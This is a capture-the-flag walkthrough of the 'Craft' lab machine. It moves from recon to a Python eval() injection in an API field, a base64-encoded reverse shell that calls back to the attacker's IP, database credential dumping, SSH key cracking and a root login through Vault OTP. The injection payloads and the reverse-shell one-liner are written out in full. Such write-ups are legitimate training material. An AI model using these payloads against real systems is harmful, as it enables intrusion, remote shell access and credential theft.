![craft logo](Images/craft%20logo.png)

# Attack Chain

```
nmap → craft.htb + api + gogs
└─► Gogs repo craft-api → hardcoded creds + eval() on abv
    └─► API auth → eval() RCE (blind sleep) → reverse shell
        └─► root in API container → settings.py DB creds
            └─► pymysql dump user table → 3 creds valid on Gogs
                └─► gilfoyle craft-infra repo → encrypted id_rsa
                    └─► john crack → SSH → gilfoyle → user.txt
                        └─► .vault-token + vault-ssh-helper → role root_otp
                            └─► vault OTP → ssh root@127.0.0.1 (OTP as pass) → root.txt
```

# Summary

- [Enumeration](#enumeration)
- [Website - Port 443](#website---port-443)
- [API Swagger](#api-swagger)
- [Gogs](#gogs)
	- [Get a valid token](#get-a-valid-token)
	- [Testing the RCE](#testing-the-rce)
	- [Reverse Shell](#reverse-shell)
- [Lateral Movement](#lateral-movement)
	- [MySQL](#mysql)
	- [GOGS - craft-infra repository](#gogs---craft-infra-repository)
	- [Crack ssh key password](#crack-ssh-key-password)
	- [Shell as gilfoyle](#shell-as-gilfoyle)
- [Privilege Escalation](#privilege-escalation)

---
# Enumeration

Let's start the target and see which ports are open.

```bash
nmap -sVC 10.129.25.2 -oA nmap

PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
| ssh-hostkey: 
|   2048 bd:e7:6c:22:81:7a:db:3e:c0:f0:73:1d:f3:af:77:65 (RSA)
|   256 82:b5:f9:d1:95:3b:6d:80:0f:35:91:86:2d:b3:d7:66 (ECDSA)
|_  256 28:3b:26:18:ec:df:b3:36:85:9c:27:54:8d:8c:e1:33 (ED25519)
443/tcp  open  ssl/http nginx 1.15.8
| ssl-cert: Subject: commonName=craft.htb/organizationName=Craft/stateOrProvinceName=NY/countryName=US
| Not valid before: 2019-02-06T02:25:47
|_Not valid after:  2020-06-20T02:25:47
|_ssl-date: TLS randomness does not represent time
| tls-nextprotoneg: 
|_  http/1.1
| tls-alpn: 
|_  http/1.1
|_http-server-header: nginx/1.15.8
|_http-title: About
6022/tcp open  ssh      Golang x/crypto/ssh server (protocol 2.0)
| ssh-hostkey: 
|_  2048 5b:cc:bf:f1:a1:8f:72:b0:c0:fb:df:a3:01:dc:a6:fb (RSA)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

There are 3 open ports and there is a redirection to `craft.htb` on port 443.

Let's add the entry to our `/etc/hosts` file.

```bash
echo '10.129.25.2 craft.htb' | tee -a /etc/hosts
```

# Website - Port 443

Let's begin by inspecting the target's website.

![craft.htb](Images/craft.htb.png)

We are landing on a page explaining what craft is, and it promotes their API available on one of the 2 links at the upper right of the page.

# API Swagger

Clicking on **API** leads us to the subdomain `api.craft.htb`.

![api.craft.htb](Images/api.craft.htb.png)

Let's add the entry.

```bash
echo '10.129.25.2 api.craft.htb' | tee -a /etc/hosts
```

After refreshing, it looks like we have the API Swagger.

![api request](Images/api%20request.png)

But we can't do much since we don't have credentials to authenticate and we can simply do **GET** request.

# Gogs

Clicking on the icon next to API, on the default page, redirects to `https://gogs.craft.htb`.

Let's add that entry too.

```bash
echo '10.129.25.2 gogs.craft.htb' | tee -a /etc/hosts
```


![gogs](Images/gogs.png)

We have the application **Gogs** which is used to host Git services.

Sometimes public repositories are available under `Explore`, let's see if that's the case.

![gogs explore](Images/gogs%20explore.png)

We can enumerate the `craft-api` repository.

Digging a bit inside the files reveals hardcoded credentials which will be useful to authenticate on the Swagger.

![commit - creds in clear](Images/commit%20-%20creds%20in%20clear.png)

> [!NOTE]
> **Swagger Credentials**
> `dinesh` : `4aUh0A8PbVJxgd`

We can also find a "fix" for the value `abv`.

![eval()](Images/eval%28%29.png)

This "fix" introduces a vulnerability: `eval()` executes user-controlled input without sanitization. If we are able to perform the right request we could get a **Remote Code Execution (RCE)**. 


![POST request format](Images/POST%20request%20format.png)

### Get a valid token

We can try the credentials found and see if it returns a valid token.

```bash
curl -k -X GET "https://api.craft.htb/api/auth/login" -H  "accept: application/json" -u 'dinesh':'4aUh0A8PbVJxgd'
{"token":"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiZGluZXNoIiwiZXhwIjoxNzgyOTA4MjIwfQ._PYIYjrNkJ-lt3B-Wp37AqHPwCBdtGDMIyuyVkisIPE"}
```

We have a token, let's check its validity.

```bash
curl -k -X GET "https://api.craft.htb/api/auth/check" -H  "accept: application/json" -H 'X-Craft-API-Token:eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiZGluZXNoIiwiZXhwIjoxNzgyOTA4MjIwfQ._PYIYjrNkJ-lt3B-Wp37AqHPwCBdtGDMIyuyVkisIPE'
{"message":"Token is valid!"}
```

The token is valid.

### Testing the RCE

To test if we can inject a command into the **abv** field, we can use the following command.
If there is a wait time of 5 seconds, it means that our command has been run.

```bash
curl -k -X POST https://api.craft.htb/api/brew/ -H "X-Craft-API-Token:eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiZGluZXNoIiwiZXhwIjoxNzgyOTEzMTUzfQ.kLjvcRv3J7f4gCkm49QabCLZAIVC69N9fI6ZMPyoZeY" -H "Content-Type: application/json" --data-raw '{"id":1,"brewer":"test","name":"test","style":"test","abv":"__import__(\"time\").sleep(5) or 2"}'
```

### Reverse Shell

After the successful POC, we can use this python reverse shell that we will encode in base64.

```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.*.*",6767));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")
```

And we run this command :

```bash
curl -k -X POST https://api.craft.htb/api/brew/ -H "X-Craft-API-Token:eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiZGluZXNoIiwiZXhwIjoxNzgyOTEyNTQ5fQ.wO8HIhJliwfeiWL0tDY2v-cEAoabE0sxw3TA-5ENbXs" -H "Content-Type: application/json" --data-raw '{"id":1,"brewer":"test","name":"test","style":"test","abv":"exec(__import__(\"base64\").b64decode(\"aW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zO3M9c29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCxzb2NrZXQuU09DS19TVFJFQU0pO3MuY29ubmVjdCgoIjEwLjEwLjE0LjY3Iiw2NzY3KSk7b3MuZHVwMihzLmZpbGVubygpLDApOyBvcy5kdXAyKHMuZmlsZW5vKCksMSk7b3MuZHVwMihzLmZpbGVubygpLDIpO2ltcG9ydCBwdHk7IHB0eS5zcGF3bigic2giKQ==\").decode())"}'
```

The character `\` is used to escape the syntax, otherwise our payload would fail since it wouldn't parse the command as we want and would break the command after it meets the first `"`.

We should have a connection back on our listener.

```bash
penelope -i tun0 -p 6767 -U
[+] Listening for reverse shells on 10.10.*.*:6767 
➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
[+] [New Reverse Shell] => 5a3d243127f5 10.129.25.2 Linux-x86_64 👤 root(0) 😍️ Session ID <1>
[+] Interacting with session [1] • PTY • Menu key F12 ⇐
[+] Session log: /home/makiss/.penelope/sessions/5a3d243127f5~10.129.25.2-Linux-x86_64/2026_07_01-09_28_12-987-root(0).log
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
id
uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
/opt/app # ls
app.py     craft_api  dbtest.py  tests
```

Since I used `penelope` here, I had to add the flag `-U` so it doesn't try to auto upgrade the shell and break it afterward.

# Lateral Movement

We are inside a container hosting the Flask API, let's look for configuration files in order to pivot to the target system.

### MySQL

```bash
/opt/app/craft_api # cat settings.py 
# Flask settings
FLASK_SERVER_NAME = 'api.craft.htb'
FLASK_DEBUG = False  # Do not use debug mode in production

# Flask-Restplus settings
RESTPLUS_SWAGGER_UI_DOC_EXPANSION = 'list'
RESTPLUS_VALIDATE = True
RESTPLUS_MASK_SWAGGER = False
RESTPLUS_ERROR_404_HELP = False
CRAFT_API_SECRET = 'hz66OCkDtv8G6D'

# database
MYSQL_DATABASE_USER = 'craft'
MYSQL_DATABASE_PASSWORD = 'qLGockJ6G2J75O'
MYSQL_DATABASE_DB = 'craft'
MYSQL_DATABASE_HOST = 'db'
SQLALCHEMY_TRACK_MODIFICATIONS = False
```

There is a MYSQL database hosted on `db`, which is not the machine we have a reverse shell in.

We can inspect its IP with `nslookup`.
```bash
nslookup db 2>/dev/null

Name:      db
Address 1: 172.20.0.4 craft_db_1.craft_default
```

It looks like the host `db` is in the internal network. However, we can use the library `pymysql` from python to connect remotely to the database and list the tables.

```bash 
/opt/app/craft_api # python3 -c '
import pymysql
c=pymysql.connect(host="db",user="craft",password="qLGockJ6G2J75O",database="craft")
cur=c.cursor()
cur.execute("SHOW TABLES")
print(cur.fetchall())'
(('brew',), ('user',))
```

There are 2 tables, `brew` and `user`. Let's target `user` and retrieve everything from it.

```bash
/opt/app/craft_api # python3 -c '
import pymysql
c=pymysql.connect(host="db",user="craft",password="qLGockJ6G2J75O",database="craft")
cur=c.cursor()
cur.execute("SELECT * FROM user")
print(cur.fetchall())'

((1, 'dinesh', '4aUh0A8PbVJxgd'), (4, 'ebachman', 'llJ77D8QFkLPQB'), (5, 'gilfoyle', 'ZEU3N8WNM2rh4T'))
```

We retrieved credentials for 3 users. Though they don't work over SSH, they work on **GOGS**.

### GOGS - craft-infra repository

It appears that the user `gilfoyle` has access to one more repository.

![gogs gilfoyle](Images/gogs%20gilfoyle.png)

After a quick inspection, it looks like it contains an SSH private key.

![craft-infra](Images/craft-infra.png)


![ssh files](Images/ssh%20files.png)


![ssh private key](Images/ssh%20private%20key.png)

### Crack ssh key password

The key is encrypted with a password, but we can crack it using `john`.

```
ssh2john id_rsa > id_rsa_hash.txt
```

```
john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa_hash.txt

<SNIP>

ZEU3N8WNM2rh4T

<SNIP>
```

### Shell as gilfoyle

We can now connect over SSH with the private key.

```bash
ssh -i id_rsa gilfoyle@craft.htb


  .   *   ..  . *  *
*  * @()Ooc()*   o  .
    (Q@*0CG*O()  ___
   |\_________/|/ _ \
   |  |  |  |  | / | |
   |  |  |  |  | | | |
   |  |  |  |  | | | |
   |  |  |  |  | | | |
   |  |  |  |  | | | |
   |  |  |  |  | \_| |
   |  |  |  |  |\___/
   |\_|__|__|_/|
    \_________/



Enter passphrase for key 'id_rsa': ZEU3N8WNM2rh4T
Linux craft.htb 6.1.0-12-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.52-1 (2023-09-07) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Thu Nov 16 08:03:39 2023 from 10.10.14.23
gilfoyle@craft:~$
```

We can grab `user.txt` from here.

# Privilege Escalation

From the gogs repository, there is a file `secrets.sh`.

![secrets.sh](Images/secrets.sh.png)

The user has likely configured “Vault” in order to manage SSH logins.

In his home directory we can find the file `.vault-token`.

```bash
gilfoyle@craft:~$ cat .vault-token 
f1783c8d-41c7-0b12-d1c1-cf2aa17ac6b9
```

And we can see in `/etc/hosts` that there is an entry concerning vault.

```bash
gilfoyle@craft:~$ cat /etc/hosts

127.0.0.1	localhost
127.0.1.1	craft craft.htb api.craft.htb gogs.craft.htb

# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters

172.20.0.2 vault.craft.htb
```

There is also the binary `vault` which probably means we can interact with it and escalate our privileges.

```bash
gilfoyle@craft:~$ ls /usr/local/bin
docker-compose	vault  vault-ssh-helper
```

We can see Vault documentation [here](https://developer.hashicorp.com/vault/docs/secrets/ssh/one-time-ssh-passwords).

After reading the documentation, and knowing the role used with vault from the file `secrets.sh`, we can use that command to get a token so we are able to authenticate over ssh as `root`.

```bash
gilfoyle@craft:~$ vault write ssh/creds/root_otp ip=127.0.0.1
Key                Value
---                -----
lease_id           ssh/creds/root_otp/09f4937c-5b14-7eca-caf6-3cf00ab3c761
lease_duration     768h
lease_renewable    false
ip                 127.0.0.1
key                1a2cbdb9-0952-e076-6567-bcd5450c1b28
key_type           otp
port               22
username           root
```

The token is in the field `key`.

Now trying to connect as `root` with that token should work.

```bash
gilfoyle@craft:~$ ssh root@127.0.0.1


  .   *   ..  . *  *
*  * @()Ooc()*   o  .
    (Q@*0CG*O()  ___
   |\_________/|/ _ \
   |  |  |  |  | / | |
   |  |  |  |  | | | |
   |  |  |  |  | | | |
   |  |  |  |  | | | |
   |  |  |  |  | | | |
   |  |  |  |  | \_| |
   |  |  |  |  |\___/
   |\_|__|__|_/|
    \_________/



Password: 1a2cbdb9-0952-e076-6567-bcd5450c1b28

<SNIP>

root@craft:~#
```

It worked!


We can also use another technique mentioned in the documentation that leads to the same result.

```bash
gilfoyle@craft:~$ vault ssh -role root_otp -mode otp root@127.0.0.1

<SNIP>

OTP for the session is: e836e46a-64b7-3f17-37d7-a14f542bd343


  .   *   ..  . *  *
*  * @()Ooc()*   o  .
    (Q@*0CG*O()  ___
   |\_________/|/ _ \
   |  |  |  |  | / | |
   |  |  |  |  | | | |
   |  |  |  |  | | | |
   |  |  |  |  | | | |
   |  |  |  |  | | | |
   |  |  |  |  | \_| |
   |  |  |  |  |\___/
   |\_|__|__|_/|
    \_________/



Password: e836e46a-64b7-3f17-37d7-a14f542bd343

<SNIP>

root@craft:~#
```


> [!TIP]
> **Machine Rooted!**